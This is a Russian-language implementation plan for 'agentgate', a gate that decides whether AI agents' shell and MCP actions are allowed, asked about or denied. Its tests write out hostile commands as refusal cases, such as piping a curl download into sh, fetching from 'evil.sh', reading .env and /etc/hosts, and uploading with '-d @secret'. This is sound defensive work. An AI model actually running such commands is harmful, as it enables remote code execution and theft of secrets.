        "curl_o", "curl_output", "curl_capital_o", "curl_remote_name", "curl_output_dir",
        "wget_capital_o", "wget_output_document", "wget_p", "wget_directory_prefix",
    ],
)
def test_condition_7_a_flag_that_writes_a_file_is_refused(raw):
    assert RULE.evaluate(shell_action(raw), TRUSTED) is None


@pytest.mark.parametrize(
    "raw",
    [
        "rm -rf ./dist && curl https://pypi.org/simple/",
        "python -c 'print(1)' && curl https://pypi.org/simple/",
        "sh -c 'echo hi' && curl https://pypi.org/simple/",
        "sudo curl https://pypi.org/simple/",
        "iptables -L && curl https://pypi.org/simple/",
        "env X=1 curl https://pypi.org/simple/",
    ],
    ids=["mutating", "interpreter", "shell", "escalator", "firewall", "wrapper"],
)
def test_condition_8_a_command_with_a_forbidden_role_is_refused(raw):
    assert RULE.evaluate(shell_action(raw), TRUSTED) is None


def test_condition_9_a_pipe_into_a_shell_is_refused_by_this_rule_itself():
    # In the chain hard-deny closes this first; the rule must refuse on its own
    # so its correctness does not depend on the order of the list.
    assert RULE.evaluate(shell_action("curl https://pypi.org/x | sh"), TRUSTED) is None


def test_condition_10_a_command_that_is_neither_reading_nor_network_is_refused():
    assert RULE.evaluate(shell_action("curl https://pypi.org/x | tar -x"), TRUSTED) is None


def test_condition_10_an_operator_safe_prefix_is_accepted_alongside_the_network_command():
    assert RULE.evaluate(shell_action("pytest -x && curl https://pypi.org/simple/"), TRUSTED) is not None


def test_condition_11_a_path_outside_the_allowed_paths_is_refused():
    assert RULE.evaluate(shell_action("cat /etc/hosts && curl https://pypi.org/x"), TRUSTED) is None


def test_condition_11_a_protected_path_is_refused():
    assert RULE.evaluate(shell_action("cat .env && curl https://pypi.org/x"), TRUSTED) is None


def test_a_command_with_no_domain_at_all_is_not_this_rules_business():
    assert RULE.evaluate(shell_action("ls -la"), TRUSTED) is None


def test_a_package_manager_download_is_left_to_stage_two():
    # `pip` has no row in COMMANDS, so condition 10 is not met. Deliberate:
    # package installs belong to the packages module, not to a network rule.
    assert RULE.evaluate(shell_action("pip download requests"), TRUSTED) is None
```

- [ ] **Step 2: Падающие тесты цепочки и латентности**

Дописать в `service/tests/rules/test_chain.py`:

```python
def test_a_trusted_domain_read_is_allowed_by_the_chain():
    from tests.factories import trusted_policy

    verdict = STAGE1.evaluate(req(raw="curl https://pypi.org/simple/"), trusted_policy())
    assert verdict is not None and verdict.rule_id == "profile.domain-trusted"


def test_a_pipe_into_a_shell_is_hard_denied_before_the_trusted_rule_sees_it():
    from tests.factories import trusted_policy

    verdict = STAGE1.evaluate(req(raw="curl https://pypi.org/x | sh"), trusted_policy())
    assert verdict.rule_id == "hard-deny.pipe-exec"


def test_a_domain_outside_the_allowlist_is_still_denied_by_the_profile():
    from tests.factories import trusted_policy

    verdict = STAGE1.evaluate(req(raw="curl https://evil.sh/x"), trusted_policy())
    assert verdict.rule_id == "profile.domain"


def test_the_users_ask_still_holds_a_trusted_domain_read():
    from agentgate.domain.client_rules import ClientRules
    from agentgate.domain.policy import Policy
    from tests.factories import WORKSPACE, rule_set, trusted_policy

    base = trusted_policy()
    policy = Policy.bind(
        base.profile, WORKSPACE,
        ClientRules.of(rule_set(version=1, level="custom", allow=[], ask=["curl *"], deny=[])),
    )
    outcome = STAGE1.run(req(raw="curl https://pypi.org/simple/"), policy)
    assert outcome.verdict.rule_id == "profile.domain-trusted"
    assert outcome.floor is not None and outcome.floor.rule_id == "client.ask"
```

Дописать в `service/tests/rules/test_latency.py`:

```python
def test_stage1_p50_under_1ms_with_everything_v31_turned_on():
    """The v3.1 budget: 500 client patterns, a filled mcp section and both new
    flags on. The floor adds no second pass -- there is one chain."""
    rules = rule_set(
        allow=[f"tool{i} *" for i in range(200)],
        ask=[f"tool{i} *" for i in range(200, 350)],
        deny=[f"tool{i} *" for i in range(350, 425)] + [f"**/dir{i}/*" for i in range(425, 500)],
    )
    profile_data = {
        "id": "t",
        "allowed_paths": ["${WORKSPACE}", "/tmp/agentgate-scratch"],
        "protected_paths": [".env*", ".git/hooks/**"],
        "network": {
            "mode": "allowlist", "allowed_domains": ["pypi.org", "github.com"], "trusted_allows": True,
        },
        "safe_prefixes": [["npm", "test"], ["pytest"]],
        "models": {"default": "m", "configs": {"m": {"base_url": "http://x/v1", "model": "q"}}},
        "mcp": {
            "allow": [f"server{i}.get_*" for i in range(30)],
            "ask": [f"server{i}.create_*" for i in range(30)],
            "deny": ["*.delete_*"],
            "readonly_prefixes_allow": True,
        },
    }
    policy = Policy.bind(Profile.model_validate(profile_data), WORKSPACE, ClientRules.of(rules))
    samples = []
    for raw in COMMANDS:
        t0 = time.perf_counter()
        action = shell_action(raw, WORKSPACE)
        STAGE1.run(action, policy)
        samples.append((time.perf_counter() - t0) * 1000)
    p50 = statistics.median(samples)
    assert p50 <= 1.0, f"p50={p50:.3f}ms"
```

В верхний блок импортов `test_latency.py` добавить `from agentgate.profiles.schema import Profile`.

- [ ] **Step 3: Убедиться, что падают**

Run: `cd service && uv run pytest tests/rules/test_profile_domain_trusted.py -q`
Expected: `ModuleNotFoundError: No module named 'agentgate.rules.profile_domain_trusted'`.

- [ ] **Step 4: Реализация `agentgate/rules/profile_domain_trusted.py`**

```python
"""The one positive verdict a listed domain can carry.

`network.allowed_domains` stays what it has always been: a gate that
forbids. A domain in the list means "going there is not forbidden", not
"this command is safe" -- `curl -X DELETE https://github.com/...` is a
listed domain and a destructive act.

So the positive case is a rule of its own, off unless the operator turns
it on (`network.trusted_allows`), and it answers `allow` only when the
single reason the action did not pass the server allowlist is that it
touches the network. That is stated as a list of conditions rather than a
sprinkle of network inside `allowlist.py`, because a list can be read, can
be covered by a table of tests, and keeps the network policy in one file.

Every condition must hold; failing any of them, the rule says nothing and
the action goes on to stage 2. This rule never denies -- denying an
unlisted domain is `ProfileDomainRule`'s job, upstream in the chain.

Conditions 5-7 and 9 are the ones that make the list worth writing:
`curl … | sh` is closed by hard-deny long before this rule runs, but the
rule refuses it on its own so its correctness does not depend on the order
of the chain; `curl -o file` and `curl … > file` are closed by 7 and 5.
"""

from agentgate.api.schemas import Tool
from agentgate.domain.domains import domain_allowed
from agentgate.domain.policy import Policy
from agentgate.domain.verdict import Verdict
from agentgate.normalize.model import NormalizedAction, SimpleCommand
from agentgate.normalize.paths import is_within, matches_any
from agentgate.profiles.schema import NetworkMode
from agentgate.rules.allowlist import _is_readonly, _matches_prefix
from agentgate.shell.commands import Role, spec_for
from agentgate.shell.paths import PathRole, command_paths, writes_a_file

# Modes in which a listed domain is a considered choice of the operator's.
# `off` forbids the network as a class; `open` has no gate at all, so the
# list influences nothing there and reading a promise into it would be
# inventing an intention the operator never expressed.
_TRUSTING_MODES = (NetworkMode.allowlist, NetworkMode.ask)

# Roles that make a command more than a read: it changes something, runs
# something, or carries someone else's privileges.
_FORBIDDEN_ROLES = frozenset({
    Role.MUTATING, Role.INTERPRETER, Role.SHELL,
    Role.ESCALATOR, Role.FIREWALL, Role.WRAPPER, Role.STDIN_FORWARDER,
})


class ProfileDomainTrustedRule:
    id = "profile.domain-trusted"
    hard = False

    def evaluate(self, action: NormalizedAction, policy: Policy) -> Verdict | None:
        if not self._network_trusts(action, policy):
            return None
        if not self._shape_is_readable(action):
            return None
        if not all(self._command_is_a_read(c, policy) for c in action.commands):
            return None
        if not self._paths_are_safe(action, policy):
            return None
        return Verdict.allow(self.id)

    def _network_trusts(self, action: NormalizedAction, policy: Policy) -> bool:
        """Conditions 1 and 4."""
        network = policy.network
        if not network.trusted_allows or network.mode not in _TRUSTING_MODES:
            return False
        if not action.domains:
            return False
        return all(domain_allowed(d, network.allowed_domains) for d in action.domains)

    def _shape_is_readable(self, action: NormalizedAction) -> bool:
        """Conditions 2 and 3."""
        if action.tool is not Tool.shell or not action.commands:
            return False
        flags = action.flags
        return not (flags.unparseable or flags.has_eval or flags.has_subst)

    def _command_is_a_read(self, command: SimpleCommand, policy: Policy) -> bool:
        """Conditions 5-10, for one command."""
        if writes_a_file(command):
            return False
        spec = spec_for(command.argv[0])
        argv = set(command.argv[1:])
        if spec.upload_flags & argv or spec.output_flags & argv:
            return False
        if _FORBIDDEN_ROLES & spec.roles:
            return False
        return (
            _is_readonly(command)
            or Role.NETWORK in spec.roles
            or _matches_prefix(command, policy.safe_prefixes)
        )

    def _paths_are_safe(self, action: NormalizedAction, policy: Policy) -> bool:
        """Condition 11."""
        paths = [
            p
            for c in action.commands
            for p in command_paths(c.argv, action.cwd, PathRole.ANY)
        ]
        return all(
            is_within(p, policy.allowed_paths)
            and not matches_any(p, policy.protected_paths, policy.workspace)
            for p in paths
        )
```

Замечание для исполнителя: `_is_readonly` и `_matches_prefix` — приватные функции `agentgate/rules/allowlist.py`, и импорт приватного имени между модулями одного пакета здесь сознателен: условие 10 спеки сформулировано как «`_is_readonly` в смысле allowlist», и вторая копия этого определения — ровно то дублирование знания, ради устранения которого §5.2 требует общей функции для доменов. Если ревью потребует иного — переименовать обе в `is_readonly`/`matches_prefix` в `allowlist.py` одним движением и поправить два места вызова внутри него; больше их никто не зовёт.

Условие 9 (нет интерпретатора или shell в пайплайне) выполняется проверкой `_FORBIDDEN_ROLES` по каждой команде — `sh` в `curl … | sh` есть отдельная команда действия. Отдельный тест на него всё равно написан (Step 1), потому что это тот самый случай, ради которого весь список.

- [ ] **Step 5: `agentgate/rules/chain.py` — строка после allowlist**

```python
from agentgate.rules.profile_domain_trusted import ProfileDomainTrustedRule
```

```python
STAGE1 = RuleChain([
    UnparseableRule(),
    *HARD_DENY_RULES,
    WrapperUnresolvedRule(),
    ClientRulesRule("deny"),
    ProfilePathRule(),
    ProfileDomainRule(),
    ProfileMcpRule(),
    ClientRulesRule("ask"),
    ClientRulesRule("allow"),
    AllowlistRule(),
    McpReadonlyRule(),
    ProfileDomainTrustedRule(),
    PackagesRule(),
])
```

Дописать в докстринг `chain.py`:

```python
"""...

`ProfileDomainTrustedRule` sits right after the allowlist: it is the
allowlist extended to network reads, so everything the allowlist already
permitted never reaches it, and everything stricter -- hard-deny, the
user's denial, the profile's denials, the user's floor -- has already run.
"""
```

- [ ] **Step 6: Тесты проходят**

Run: `cd service && uv run pytest tests/rules -q`
Expected: PASS. Latency-тест печатает p50; при провале смотреть, не съел ли бюджет `command_paths` на длинных пайплайнах, и мерить `_paths_are_safe` отдельно — но правило выполняется только при `trusted_allows`, поэтому на профилях по умолчанию оно стоит один `if`.

- [ ] **Step 7: Полный прогон и контракт**

Run: `cd service && <FULL> && git diff --exit-code ../contracts`
Expected: PASS, без diff.

- [ ] **Step 8: Коммит**

```bash
git commit --only service/agentgate/rules/profile_domain_trusted.py service/agentgate/rules/chain.py service/tests/rules/test_profile_domain_trusted.py service/tests/rules/test_chain.py service/tests/rules/test_latency.py -m "feat(rules): a trusted domain can carry an allow — eleven conditions, off by default

Co-Authored-By: Claude Fable 5.1 <noreply@anthropic.com>"
```

---

## Волна 3 — сборка

### Task 7: Контракты и документация

Закрывает §6 целиком. Зависит от задач 3–6.

**Files:**
- Modify: `contracts/openapi.yaml` (перегенерация), `contracts/README.md`, `docs/connect.md`, `CLAUDE.md`, `service/CLAUDE.md`, `service/README.md`
- Test: `service/tests/test_contracts.py`

- [ ] **Step 1: Перегенерация контрактов**

```bash
cd service && uv run python scripts/export_contracts.py && uv run python scripts/export_openapi.py
git diff --stat ../contracts
```
Expected: если задача 2 уже перегенерировала документ, diff пустой; если в задачах 3–6 что-то попало в схемы — увидеть это здесь и объяснить, потому что по §6 меняться должна только схема профиля.

Run: `cd service && uv run pytest tests/test_contracts.py -q`
Expected: PASS.

- [ ] **Step 2: `contracts/README.md` — раздел v3.1**

Добавить после раздела «v3: правила пользователя и `/v1/inspect`»:

```markdown
## v3.1: строгость, MCP на ступени 1, доверенные домены

`DecideRequest` и `DecideResponse` не изменились. Изменились три вещи, которые видит интегратор.

**`rules.ask` больше не отменяет `deny` сервиса.** Клиентский `ask` теперь пол строгости, а не вердикт: он не даёт исходу быть мягче `ask`, но не мешает ступени 2 ответить `deny`. Практически:

- `kubectl delete namespace prod --force` при `rules.ask: ["kubectl *"]` → `deny`, `stage: 2` (раньше был `ask`);
- `git status` при `rules.ask: ["git *"]` → `ask`, `stage: 1`, `rule_id: client.ask`, `model: null` — модель не вызывается: детерминированная ступень уже доказала безопасность, а строже `ask` пол не поднимает;
- `client.ask` может теперь прийти и со `stage: 2` — это исход классификатора, поднятый полом; `reason`, `model`, `latency_ms.stage2` и `cost` в такой строке принадлежат модели, `rule_id` — вашему правилу.

Число обращений к модели от пола не растёт ни на одном запросе.

**`rules` матчат MCP-вызовы.** Канонический вид — `server.tool` (`github.get_issue`), сравнение `fnmatch`, регистр не приводится. `arguments` вызова в матчинге не участвуют никогда. Ограничение: шаблон, содержащий `/` (например, имя сервера `org/github`), система считает путевым и никогда не сопоставит с MCP-вызовом — таких имён серверов в шаблонах следует избегать.

**Новые значения `rule_id`:** `profile.mcp-allow`, `profile.mcp-ask`, `profile.mcp-deny`, `allowlist.mcp-readonly`, `profile.domain-trusted`. Словарь `rule_id` открытый; матчить на него в адаптере по-прежнему не нужно.

**Схема профиля (`GET /v1/profiles/{id}`) расширена:** `network.trusted_allows: bool = false` и секция `mcp: {allow, ask, deny, readonly_prefixes_allow}`. У всех профилей изменился `profile_hash` — старые записи в ленте отличаются хэшем от новых, это ожидаемо.
```

- [ ] **Step 3: `docs/connect.md` — примечание для интегратора**

В раздел «Спросить решение» (или отдельным подразделом «Правила и MCP» после «Что означают ответы») добавить:

```markdown
## Правила и MCP-вызовы

Шаблоны `rules` сопоставляются с MCP-вызовом по строке `server.tool` — например `github.get_issue`. Работают те же глобы, что и для команд: `github.get_*`, `*.delete_*`. Регистр важен: `github.Get_Issue` не совпадёт с `github.get_*`. Аргументы вызова не участвуют в сопоставлении.

Одно ограничение: если в имени MCP-сервера есть `/`, шаблон вроде `org/github.*` будет прочитан как путевой и не совпадёт ни с одним MCP-вызовом. Используйте имя сервера без `/`.

`rules.ask` — просьба подтвердить, а не разрешение: она не даёт решению стать мягче `ask`, но не отменяет `deny` сервиса. Команда из вашего `ask`-списка, которую сервис считает опасной, вернётся как `deny`.
```

- [ ] **Step 4: корневой `CLAUDE.md`**

1. В «Что построено» заменить заголовок раздела на «Что построено (v3.1 по функциям, v1.5 по форме кода)» и дописать абзац:

```markdown
С v3.1 упорядочена строгость. Клиентский `ask` больше не вердикт ступени 1, а **пол**: `Verdict.floor`, `ChainOutcome` (`rules/base.py`), применение в `Gate._evaluate`. Пол не даёт исходу быть мягче `ask` и при этом не добавляет ни одного вызова модели: `allow` ступени 1 под полом становится `ask` на ступени 1 с `model: null`, а там, где ступень 2 и так вызывалась, пол применяется к её вердикту (`deny` побеждает, `allow` поднимается, при равенстве в ответ идёт `rule_id: client.ask`, а `reason`/`model`/`latency`/`cost` — от классификатора). `client.deny` освобождён от эскалации свойством `Verdict.escalatable`. Ступень 1 научилась судить `mcp_call`: канонический вид `server.tool` в клиентских правилах, `ProfileMcpRule` (`mcp: {allow, ask, deny}` профиля) рядом с запретами профиля и `McpReadonlyRule` по префиксам имени под флагом `mcp.readonly_prefixes_allow`. Разрешённый домен может дать `allow` — но только через отдельное правило `ProfileDomainTrustedRule` под `network.trusted_allows: true` и только при выполнении всех одиннадцати условий §5.2 спеки; `allowed_domains` остаётся запретительными воротами.
```

2. В списке файлов пакета `rules/` дописать: `profile_mcp.py`, `mcp_readonly.py`, `profile_domain_trusted.py`; в `domain/` — `domains.py`.

3. В «Зафиксировано в v1» дописать строку:

```markdown
- Клиентские правила поднимают пол и никогда не опускают потолок: `client.deny` строже любого запрета сервиса, `client.ask` не отменяет ни один `deny`.
```

4. В «Известные ограничения / roadmap» **удалить** пункт «**`client.deny` может быть поднят эскалацией до `ask`**…» (закрыт задачей 3) и **дописать**:

```markdown
- **Шаблон с `/` в имени MCP-сервера не совпадёт.** `is_path_pattern` читает `/` как признак пути, поэтому `rules: ["org/github.*"]` уходит в путевые шаблоны и никогда не сопоставится с MCP-вызовом. Валидация шаблонов на это не добавлена (шаблон пользователя не обязан совпадать); ограничение записано в `contracts/README.md` и `docs/connect.md`.
- **`allowlist.mcp-readonly` судит по имени.** Префикс `get_`/`list_`/`search_`/`read_`/`describe_` — соглашение, а не гарантия; правило поэтому выключено по умолчанию, и список префиксов — константа модуля, а не поле профиля (свой список выражается через `mcp.allow` с глобами).
- **`profile_hash` изменился у всех профилей** из-за новых полей с умолчаниями: кэш `allow` прогревается заново, старые записи в ленте отличаются хэшем. Миграции данных это не требует.
- **`ask`, выданный полом на ступени 1, попадает в счётчики сессии как обычный `ask`.** Эскалация считает только `deny` (`session/escalation.py`), поэтому агент, повторяющий безопасную команду из `ask`-списка, эскалацию не накручивает; ничего дополнительно не исключается.
```

- [ ] **Step 5: `service/CLAUDE.md` и `service/README.md`**

- `service/CLAUDE.md`: в карту модулей добавить `domain/domains.py`, `rules/profile_mcp.py`, `rules/mcp_readonly.py`, `rules/profile_domain_trusted.py`; в раздел про ступень 1 дописать одно предложение: «Правило может вернуть не вердикт, а пол (`Verdict.ask(..., floor=True)`); цепочка запоминает первый пол и продолжает, `RuleChain.run` возвращает обе половины, `evaluate` — только вердикт».
- `service/README.md`, раздел «Как добавить» → «…правило ступени 1»: добавить абзац:

```markdown
Правило может ответить не вердиктом, а **полом**: `Verdict.ask(self.id, "…", floor=True)`. Пол не останавливает цепочку — он запоминается и запрещает итоговому решению быть мягче `ask`. Так устроен `client.ask`. Пол не вызывает ступень 2 там, где её не было бы: если ступень 1 уже ответила `allow`, `Gate` сам превращает его в `ask` на ступени 1 с `model: null`.
```

- [ ] **Step 6: Полный прогон и коммит**

```bash
cd service && <FULL> && git diff --exit-code ../contracts
```
Expected: PASS, контракты совпадают с только что сгенерированными.

```bash
git commit --only contracts/openapi.yaml contracts/README.md docs/connect.md CLAUDE.md service/CLAUDE.md service/README.md -m "docs: v3.1 in the contract README, the integrator page and the module maps

Co-Authored-By: Claude Fable 5.1 <noreply@anthropic.com>"
```

---

### Task 8: Прогон бенчмарка и отчёт

Закрывает §7.3 (шесть критериев приёмки). Зависит от задачи 7. В `benchmark/` ничего не меняется — он только запускается.

**Files:**
- Create: `docs/reports/task-23-v3.1-strictness-mcp-domains.md`

- [ ] **Step 1: Поднять сервис на профиле v3.1**

Собрать локальный профиль (не коммитить), включив обе новые возможности: `network.trusted_allows: true`, `allowed_domains: [pypi.org, github.com]`, непустую секцию `mcp`. Запустить сервис на нём:

```bash
cd service && AGENTGATE_PROFILES_DIR=./profiles AGENTGATE_BIND=127.0.0.1:8400 uv run python -m agentgate
```

- [ ] **Step 2: Критерий 1 — пол**

```bash
curl -s localhost:8400/v1/decide -H 'Authorization: Bearer $AGENTGATE_TOKEN' -H 'Content-Type: application/json' \
  -d '{"harness":"t","tool":"shell","raw":"kubectl delete namespace prod --force","args":{"cwd":"/home/u/repo"},"user_request":"clean up","rules":{"version":1,"ask":["kubectl *"]}}' | jq '{decision,stage,rule_id,model}'
```
Expected: `decision: "deny"`, `stage: 2`.

```bash
curl -s localhost:8400/v1/decide -H 'Authorization: Bearer $AGENTGATE_TOKEN' -H 'Content-Type: application/json' \
  -d '{"harness":"t","tool":"shell","raw":"git status","args":{"cwd":"/home/u/repo"},"user_request":"check","rules":{"version":1,"ask":["git *"]}}' | jq '{decision,stage,rule_id,model}'
```
Expected: `decision: "ask"`, `stage: 1`, `rule_id: "client.ask"`, `model: null`.

- [ ] **Step 3: Критерий 3 — доверенные домены**

```bash
for raw in "curl https://pypi.org/simple/" "git fetch https://github.com/org/repo"; do
  curl -s localhost:8400/v1/decide -H 'Authorization: Bearer $AGENTGATE_TOKEN' -H 'Content-Type: application/json' \
    -d "{\"harness\":\"t\",\"tool\":\"shell\",\"raw\":\"$raw\",\"args\":{\"cwd\":\"/home/u/repo\"},\"user_request\":\"install\"}" | jq -c '{decision,stage,rule_id}'
done
```
Expected: обе строки — `{"decision":"allow","stage":1,"rule_id":"profile.domain-trusted"}`.

- [ ] **Step 4: Критерий 2 — MCP-кейсы ATBench**

```bash
cd benchmark && export SECURITY_SERVICE_URL=http://127.0.0.1:8400
uv run python cli.py benchmark --path attacks/cases --category mcp_tool_attack --out results/v31-mcp
uv run python cli.py report --run-id <RUN_ID> --json | jq '[.cases[] | select(.stage == 1)] | length'
```
Expected: доля решённых ступенью 1 больше нуля. Контрольный прогон с профилем, где секция `mcp` пуста, — ноль, и это ожидаемо: записать оба числа в отчёт.

- [ ] **Step 5: Критерии 4 и 5 — контрольная группа из 30 кейсов**

```bash
cd benchmark && uv run python cli.py benchmark --path attacks/cases --category benign_utility --out results/v31-benign
```
Считать число вызовов ступени 2 (`stage == 2` в отчёте).
Expected по критерию 4: 13 при `trusted_allows: true` (было 17). Если число иное — записать фактическое и объяснить построчно, какие кейсы остались на ступени 2 и почему (`pip download` входит в эти 13 по §5.2).

Тот же прогон с непустым `rules.ask` (флаг бенчмарка не предусмотрен — прогнать через профиль клиента адаптера либо повторить проверку инвариантом из `tests/engine/test_gate_floor.py::test_a_floor_never_changes_which_calls_reach_the_model` и записать это как основание). Expected по критерию 5: число вызовов ступени 2 не растёт.

- [ ] **Step 6: Критерий 6 — идентичность на выключенных флагах**

```bash
cd benchmark && uv run python cli.py benchmark --path attacks/cases --out results/v31-off   # профиль без mcp, trusted_allows: false
uv run python cli.py compare <RUN_BEFORE_V31> <RUN_V31_OFF>
```
Expected: расхождений по вердиктам ноль.

- [ ] **Step 7: Отчёт**

Создать `docs/reports/task-23-v3.1-strictness-mcp-domains.md` на русском, по образцу `docs/reports/task-22-v3-rules-and-inspect.md`. Обязательные разделы:

1. **Что построено** — по задачам 1–7, с именами файлов.
2. **Доказательства TDD** — по задаче: какой тест падал первым и с какой ошибкой, что сделало его зелёным.
3. **Числа приёмки** — шесть критериев §7.3 с фактическими значениями: два ответа критерия 1, доля ступени 1 на MCP-кейсах с секцией и без, число вызовов ступени 2 на контрольной группе (до/после), результат сравнения прогонов.
4. **Решения и отступления** — отступление по `RuleChain.run` вместо смены сигнатуры `evaluate` (обоснование — в «Global Constraints» этого плана); импорт `_is_readonly`/`_matches_prefix` из `allowlist.py` и почему это не дублирование; факт, что при `stage: 2` под полом `reason` берётся у классификатора и в строке `allow → ask` тоже.
5. **Что изменилось для интегратора** — `profile_hash` у всех профилей, новые `rule_id`, `client.ask` со `stage: 2`.
6. **Отложено** — всё из §8 спеки: пересмотр эскалации для запретов профиля, кэширование `deny`/`ask`, матчинг по `arguments`, реестр MCP-серверов, `PackagesRule`.
7. **Находки ревью и как закрыты** — заполняется по факту.

- [ ] **Step 8: Финальная проверка и коммит**

```bash
cd service && <FULL> && git diff --exit-code ../contracts
```
Expected: полный прогон зелёный дважды подряд, контракты без diff.

```bash
git commit --only docs/reports/task-23-v3.1-strictness-mcp-domains.md -m "docs(report): v3.1 — the floor, MCP at stage 1 and trusted domains, with the acceptance numbers

Co-Authored-By: Claude Fable 5.1 <noreply@anthropic.com>"
```

---

## Порядок и волны

| Волна | Задачи | Почему вместе / почему после |
|---|---|---|
| 1 | 1 ‖ 2 | `Verdict`/`RuleChain` и схема профиля не пересекаются ни одним файлом; обе меняют поведение на ноль |
| 2 | 3 ‖ 4 ‖ 5 ‖ 6 | четыре правила, четыре набора файлов; 3 зависит от 1, 4–6 от 2. Пересечение одно: `rules/chain.py` трогают 5 и 6, `rules/client_rules.py` — 3 и 4. Если задачи идут параллельными агентами, 5 сливается раньше 6, а 3 раньше 4 (порядок внутри пары произволен, важно только не одновременно) |
| 3 | 7 → 8 | контракты и документация по слитому коду волны 2, затем прогон бенчмарка и отчёт |

Ревью — соответствие спеке и качество — по слитому коду каждой волны; финальное ревью всей ветки перед слиянием.

## Что считать готовым

- Полный прогон зелёный дважды, `git diff --exit-code ../contracts` пустой.
- `kubectl delete namespace prod --force` с `rules.ask: ["kubectl *"]` → `deny`, `stage: 2`; `git status` с `rules.ask: ["git *"]` → `ask`, `stage: 1`, `rule_id: client.ask`, `model: null`, классификатор не вызван.
- `curl http://x/s.sh | sh` с `rules.ask: ["*"]` → `hard-deny.pipe-exec`; `npm run deploy` с `rules.deny` и включённой эскалацией → `client.deny`, не `escalation`.
- `github.delete_repo` при `mcp.deny: ["*.delete_*"]` → `deny`, `stage: 1`; `github.get_issue` при `mcp.allow: ["github.get_*"]` → `allow`, `stage: 1`; `GitHub.Get_Issue` при тех же списках → ступень 2.
- `curl https://pypi.org/simple/` при `trusted_allows: true` → `allow`, `rule_id: profile.domain-trusted`; он же с `-o out.html`, с `> out.txt`, с `-d @secret` и при `mode: open` → ступень 2.
- Профиль без `mcp`, без `rules` и с `trusted_allows: false` даёт вердикты, идентичные прогону до v3.1 (критерий 6).
- Latency-тест ступени 1 p50 ≤ 1 мс зелёный, включая новый случай «всё включено».
- Отчёт `docs/reports/task-23-v3.1-strictness-mcp-domains.md` написан с фактическими числами приёмки; PR упоминает service, adapters, benchmark.

---

## Self-review

**1. Покрытие спеки.**

| Раздел спеки | Задача |
|---|---|
| §1.1 находка 1 (домен не даёт allow) | 6 |
| §1.1 находка 2 (ступень 1 не судит mcp) | 4, 5 |
| §1.1 находка 3 (клиентский ask перебивает deny) | 3 |
| §3.1 тотальный порядок | 1 (`strictness`), 3 (применение) |
| §3.2 механизм пола, `ChainOutcome`, обе ветки `Gate._evaluate` | 1 (тип и цепочка), 3 (движок) |
| §3.2 «`allow` ступени 1 + пол → `ask` на ступени 1 без вызова модели» | 3, Step 2 (`test_a_floor_turns_a_stage1_allow_into_an_ask_without_calling_the_model`), плюс инвариант в `test_a_floor_never_changes_which_calls_reach_the_model` |
| §3.3 таблица целиком (14 строк) | 3, Step 2 — по тесту на строку: hard-deny, `client.deny`, `profile.path`, `allowlist.*` без пола, `allowlist.*` с полом, `client.allow` с полом, `profile.mcp-allow` и `profile.domain-trusted` с полом (5, Step 3 и 6, Step 2 — через `STAGE1.run`, где видно, что вердикт есть и пол есть; исход в `Gate` — тот же код, что для `allowlist.*`), `allowlist.mcp-readonly` с полом (5, Step 3), нет вердикта, ступень 2 `deny`/`ask`/`allow`/ошибка, `unparseable` |
| §3.3 правило `rule_id` при равенстве и поля от классификатора | 3, Step 2 (`test_a_stage2_ask_keeps_the_floors_rule_id_and_the_models_own_fields`) |
| §3.4 освобождение `client.deny` от эскалации | 1 (`escalatable`), 3 (`_escalate` + `tests/engine/test_escalation.py`) |
| §3.5 кэш: не кладётся, не отдаётся | 3, Step 2 (два теста) |
| §4.1 канонический вид, `is_path_pattern` не трогается, ветка `_allow`, `arguments` вне матчинга, ограничение по `/` | 4 |
| §4.2 секция профиля, `Policy.mcp`, строгость `deny` > `ask` > `allow` | 2 (схема), 5 (семантика) |
| §4.3 `ProfileMcpRule`, три `rule_id`, позиция | 5 |
| §4.4 `McpReadonlyRule`, префиксы как константа, флаг | 5 |
| §4.5 промпт не меняется | не задача: изменений нет; проверяется тем, что `tests/classify/` не трогается |
| §5.1 `ProfileDomainRule` не меняется по поведению | 2, Step 6 (рефакторинг на общую функцию с регресс-тестом) |
| §5.2 одиннадцать условий, включая явное членство и «никогда в `open`» | 6, Step 1 (по тесту на условие; `mode_open`, `empty_allowlist`, `mode_ask` — отдельными кейсами) |
| §5.3 позиция в `STAGE1`, итоговый список | 5 и 6 (`chain.py`), проверяется тестами цепочки |
| §6 контракт: схемы не меняются, профиль меняется, `profile_hash` меняется | 2 (перегенерация), 7 (README, connect, `CLAUDE.md`) |
| §7.1 инварианты 1–11 | 1: нет; 2: 3, Step 2; 3: 3 (`test_escalation.py`); 4–6: 3, Step 2; 7: 3, Step 2 (отдельный тест); 8: 3, Step 2; 9: Global Constraints + критерий 6 в задаче 8; 10: 4, Step 1 (`arguments` не влияют); 11: 4 и 5 (матч по `McpArgs`, не по `raw`) |
| §7.2 перечень тестов | все файлы перечня заведены: `test_base.py` (1), `test_gate_floor.py` (3), `test_escalation.py` (3), `test_profile_mcp.py` (5), `test_client_rules.py` (4), `test_mcp_readonly.py` (5), `test_profile_domain_trusted.py` (6), кэш (3), latency (6), контракты (2, 7). Единственное расхождение: тесты кэша спека кладёт в `session/test_cache_key.py`, план — в `test_gate_floor.py`, потому что проверяется поведение `Gate` (что положено в кэш и что из него отдано), а не форма ключа; сам ключ уже покрыт существующими тестами `tests/engine/test_gate.py` |
| §7.3 шесть критериев приёмки | 8 |
| §8 не входит | ничего из списка не запланировано |
| §9 восемь задач, три волны | сохранены один в один: 1–2 / 3–6 / 7–8 |

**2. Плейсхолдеры.** Один артефакт формы найден и удалён при самопроверке: в задаче 6, Step 1 стоял пустой параметризованный `test_placeholder_never_runs` как оглавление одиннадцати условий; вместо него каждое условие покрыто именованным тестом. «TBD», «similar to Task N», «add error handling» и шагов без кода в плане нет; отчёт (задача 8) — единственное место, где содержание заполняется по факту прогона, и его разделы перечислены поимённо.

**3. Согласованность типов.** `Verdict.floor: bool`, `Verdict.strictness: int`, `Verdict.escalatable: bool`, `Verdict.ask(..., floor=False)` — определены в задаче 1 и используются под теми же именами в задачах 3–6. `ChainOutcome(verdict, floor)` и `RuleChain.run` — задача 1, используются в 3, 4, 5, 6. `domain_allowed(domain, allowed_domains)` — задача 2, вызывается в 2 (`profile_domains.py`) и 6. `McpPolicy` с полями `allow/ask/deny/readonly_prefixes_allow` и `Policy.mcp` — задача 2, читаются в 5. `CommandSpec.output_flags` — задача 2, читается в 6. `mcp_name(action)` определён в `rules/profile_mcp.py` (задача 5) и импортируется в `rules/mcp_readonly.py` (та же задача). Фабрики `mcp_action`, `mcp_policy`, `trusted_policy` заведены в задаче 2 и используются в 4, 5, 6. `_settled_at_stage1` и `_under_floor` — только задача 3. Расхождений имён между задачами нет.
